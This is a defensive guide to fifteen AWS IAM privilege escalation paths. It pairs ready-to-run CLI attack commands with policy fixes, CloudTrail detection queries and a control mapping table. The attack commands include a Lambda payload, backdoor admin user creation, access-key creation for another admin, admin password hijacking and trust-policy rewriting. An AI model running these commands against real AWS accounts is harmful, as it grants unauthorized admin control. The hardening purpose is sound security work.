# AWS IAM Privilege Escalation Paths

**MITRE:** T1548.005 — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access
**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts
**NIST:** AC-6 (Zero Trust), AC-2 (Account Management)
**CIS:** 5.4 — Restrict Administrator Privileges
**OWASP:** A01:2021 — Broken Access Control

---

## What Is Privilege Escalation in AWS IAM?

An attacker or insider with limited IAM permissions exploits a combination of allowed API calls to grant themselves — or a resource they control — elevated permissions. AWS does not natively block these paths. They are valid API calls used in unintended combinations.

The defense is knowing the paths exist and designing IAM policies, permission boundaries, and SCPs to close them.

---

## Path 1 — `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

**Permissions required:** `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction`

**How it works:**

The attacker creates a Lambda function and passes a high-privilege IAM role to it. The Lambda runs as that role — not as the attacker. The attacker never directly assumes the admin role but uses it through the function.

```bash
# Step 1: Find a high-privilege role
aws iam list-roles | grep Admin
# Returns: arn:aws:iam::123456789:role/AdminRole

# Step 2: Create Lambda with admin role attached
aws lambda create-function \
  --function-name escalate \
  --runtime python3.12 \
  --role arn:aws:iam::123456789:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# Step 3: Invoke it — Lambda runs as AdminRole
aws lambda invoke --function-name escalate out.json
```

Lambda payload — creates a backdoor admin user:
```python
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
```

**How to close it:**
```json
{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::123456789:role/lambda-execution-role-only"
}
```
Scope `iam:PassRole` to a specific approved role ARN — not `Resource: *`.

**CloudTrail detection:**
```sql
SELECT userIdentity.arn, requestParameters.role
FROM cloudtrail_logs
WHERE eventName = 'CreateFunction'
AND requestParameters.role NOT LIKE '%lambda-execution%'
```

---

## Path 2 — `iam:CreatePolicyVersion`

**Permissions required:** `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion`

**How it works:**

The attacker creates a new version of an existing customer-managed policy and sets it as the default. The new version grants `*:*`. Any principal attached to that policy now has full admin access.

```bash
# Create new policy version granting everything
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/DeveloperPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**How to close it:**
Deny `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` for all non-admin roles. These permissions should only exist in a break-glass admin role, not developer roles.

**CloudTrail detection:**
```sql
SELECT userIdentity.arn, requestParameters.policyArn
FROM cloudtrail_logs
WHERE eventName = 'CreatePolicyVersion'
AND requestParameters.setAsDefault = 'true'
```

---

## Path 3 — `iam:AttachUserPolicy`

**Permissions required:** `iam:AttachUserPolicy`

**How it works:**

The attacker attaches `AdministratorAccess` directly to their own IAM user.

```bash
aws iam attach-user-policy \
  --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**How to close it:**
Deny `iam:AttachUserPolicy` for all non-admin roles. Paired with `deny_iam_user_creation.json` SCP — if no IAM users exist, this path doesn't apply.

---

## Path 4 — `iam:AttachRolePolicy`

**Permissions required:** `iam:AttachRolePolicy`, `sts:AssumeRole` on target role

**How it works:**

The attacker attaches a managed admin policy to a role they can already assume. After attaching, they assume the role and have admin access.

```bash
# Attach AdministratorAccess to a role attacker can assume
aws iam attach-role-policy \
  --role-name dev-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Now assume that role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789:role/dev-role \
  --role-session-name escalated
```

**How to close it:**
Deny `iam:AttachRolePolicy` for non-admin roles. Use permission boundaries on roles — a boundary prevents a role from having more permissions than the boundary allows, even if someone attaches a broader policy.

---

## Path 5 — `iam:PutUserPolicy`

**Permissions required:** `iam:PutUserPolicy`

**How it works:**

Creates an inline policy directly on the attacker's own user granting `*:*`. Inline policies bypass some audit tools that only check attached managed policies.

```bash
aws iam put-user-policy \
  --user-name attacker \
  --policy-name backdoor \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

**How to close it:**
Deny `iam:PutUserPolicy` for non-admin roles. Inline policies are harder to audit — prefer managed policies in enterprise environments.

---

## Path 6 — `iam:AddUserToGroup`

**Permissions required:** `iam:AddUserToGroup`

**How it works:**

Attacker adds themselves to a group that has admin permissions attached.

```bash
aws iam add-user-to-group \
  --group-name Administrators \
  --user-name attacker
```

**How to close it:**
Deny `iam:AddUserToGroup` for non-admin roles. Combined with `deny_iam_user_creation.json` SCP — no users = no groups needed.

---

## Path 7 — `iam:CreateAccessKey` on Another User

**Permissions required:** `iam:CreateAccessKey`

**How it works:**

The attacker creates new access keys for an existing admin user — they don't need the admin user's password. The new keys work immediately.

```bash
aws iam create-access-key --user-name admin-user
# Returns: AccessKeyId + SecretAccessKey for admin-user
```

**How to close it:**
Scope `iam:CreateAccessKey` with a condition that only allows creating keys for the calling user's own ARN:
```json
{
    "Effect": "Allow",
    "Action": "iam:CreateAccessKey",
    "Resource": "*",
    "Condition": {
        "StringEquals": {
            "aws:ResourceAccount": "${aws:PrincipalAccount}",
            "iam:ResourceTag/Owner": "${aws:username}"
        }
    }
}
```

---

## Path 8 — `iam:CreateLoginProfile`

**Permissions required:** `iam:CreateLoginProfile`

**How it works:**

Creates a console login password for an IAM user that previously had no console access. If that user has admin permissions, the attacker now has console access as that user.

```bash
aws iam create-login-profile \
  --user-name admin-user \
  --password 'Backdoor123!' \
  --no-password-reset-required
```

**How to close it:**
Deny `iam:CreateLoginProfile` for non-admin roles.

---

## Path 9 — `iam:UpdateLoginProfile`

**Permissions required:** `iam:UpdateLoginProfile`

**How it works:**

Resets the console password for an existing admin user, locking them out and giving the attacker access.

```bash
aws iam update-login-profile \
  --user-name admin-user \
  --password 'Hijacked123!'
```

**How to close it:**
Deny `iam:UpdateLoginProfile` for non-admin roles.

---

## Path 10 — `iam:UpdateAssumeRolePolicy`

**Permissions required:** `iam:UpdateAssumeRolePolicy`

**How it works:**

Modifies a high-privilege role's trust policy to add the attacker's principal as a trusted entity. The attacker can then assume the role directly.

```bash
aws iam update-assume-role-policy \
  --role-name AdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789:user/attacker"},
      "Action": "sts:AssumeRole"
    }]
  }'
```

**How to close it:**
Deny `iam:UpdateAssumeRolePolicy` for non-admin roles. This permission should be extremely restricted — modifying trust policies is how persistent backdoors are created.

---

## Path 11 — `iam:PassRole` + `ec2:RunInstances` + SSM

**Permissions required:** `iam:PassRole`, `ec2:RunInstances`, `ssm:SendCommand`

**How it works:**

Launch an EC2 instance with an admin role attached. Use SSM to run commands on it. The commands execute as the admin role.

```bash
# Launch EC2 with admin role
aws ec2 run-instances \
  --image-id ami-12345 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminProfile \
  --user-data '#!/bin/bash'

# Send command via SSM — runs as AdminRole
aws ssm send-command \
  --instance-ids i-12345 \
  --document-name AWS-RunShellScript \
  --parameters commands='aws iam create-user --user-name backdoor'
```

**How to close it:**
Scope `iam:PassRole` to approved EC2 instance profiles only. Deny `ssm:SendCommand` for non-admin roles, or scope it to specific instance tags.

---

## Path 12 — `iam:PassRole` + `glue:CreateDevEndpoint`

**Permissions required:** `iam:PassRole`, `glue:CreateDevEndpoint`

**How it works:**

Creates an AWS Glue development endpoint — a managed Jupyter notebook environment — with an admin IAM role. Code run in the notebook executes as the admin role.

```bash
aws glue create-dev-endpoint \
  --endpoint-name escalate \
  --role-arn arn:aws:iam::123456789:role/AdminRole
```

**How to close it:**
Deny `glue:CreateDevEndpoint` if Glue is not used in the environment. This is an ideal candidate for `deny_unused_services.json` SCP.

---

## Path 13 — `cloudformation:CreateStack` + `iam:PassRole`

**Permissions required:** `cloudformation:CreateStack`, `iam:PassRole`

**How it works:**

Deploy a CloudFormation stack using a service role that has admin permissions. The stack template creates an admin IAM user or role. CloudFormation does the dirty work.

```bash
aws cloudformation create-stack \
  --stack-name escalate \
  --template-body file://backdoor.yaml \
  --role-arn arn:aws:iam::123456789:role/CloudFormationAdminRole \
  --capabilities CAPABILITY_IAM
```

**How to close it:**
Scope `iam:PassRole` for CloudFormation to approved service roles only. Deny `CAPABILITY_IAM` in CloudFormation deployments via SCP where not needed.

---

## Path 14 — `iam:SetDefaultPolicyVersion`

**Permissions required:** `iam:SetDefaultPolicyVersion`

**How it works:**

If a policy has multiple versions, the attacker switches the default to an older permissive version — without creating anything new. Harder to detect since no new policy is created.

```bash
# List versions of a policy
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::123456789:policy/DeveloperPolicy

# Switch default to an older permissive version
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/DeveloperPolicy \
  --version-id v1
```

**How to close it:**
Deny `iam:SetDefaultPolicyVersion` for non-admin roles. Audit policies to ensure old versions are deleted — maximum 5 versions per policy in AWS.

---

## Path 15 — `sts:AssumeRole` with Loose Trust Policy

**Permissions required:** `sts:AssumeRole`

**How it works:**

A role has a trust policy with a wildcard or overly broad `Principal`. Any principal in the account — or sometimes any AWS account — can assume it.

```json
{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::123456789:root"},
    "Action": "sts:AssumeRole"
}
```

`arn:aws:iam::123456789:root` means **any principal in account 123456789** — not just the root user. Every IAM user and role in the account can assume this role.

**How to close it:**
Audit trust policies. Principal should always be a specific role ARN, never `:root` unless intentional. Add conditions:
```json
{
    "Condition": {
        "StringEquals": {
            "aws:PrincipalTag/Team": "platform"
        }
    }
}
```

---

## Audit Tool

**Cloudsplaining** — scans IAM policies and flags which principals have escalation-capable permissions:

```bash
pip install cloudsplaining
cloudsplaining download --profile default
cloudsplaining scan --input-file default.json --output ./report
```

Returns an HTML report showing every principal with dangerous permission combinations.

---

## How Your Controls Close These Paths

| Path | Closed by |
|------|-----------|
| PassRole + Lambda | Scope `iam:PassRole` to approved role ARNs |
| CreatePolicyVersion | Permission boundary — deny IAM write for dev roles |
| AttachUserPolicy | SCP `deny_iam_user_creation.json` — no users, path gone |
| AttachRolePolicy | Permission boundary on all dev roles |
| PutUserPolicy | Permission boundary — deny inline policy writes |
| AddUserToGroup | SCP `deny_iam_user_creation.json` — no users or groups |
| CreateAccessKey | Scope to self-only via condition |
| CreateLoginProfile | Permission boundary — deny for dev roles |
| UpdateLoginProfile | Permission boundary — deny for dev roles |
| UpdateAssumeRolePolicy | Deny for all non-platform-admin roles |
| PassRole + EC2 + SSM | Scope PassRole + tag-based SSM restrictions |
| PassRole + Glue | SCP `deny_unused_services.json` — Glue not in env |
| CloudFormation + PassRole | Scope CloudFormation service role to approved ARN |
| SetDefaultPolicyVersion | Permission boundary — deny for dev roles |
| Loose trust policy | IAM access review + SCPconditions on AssumeRole |
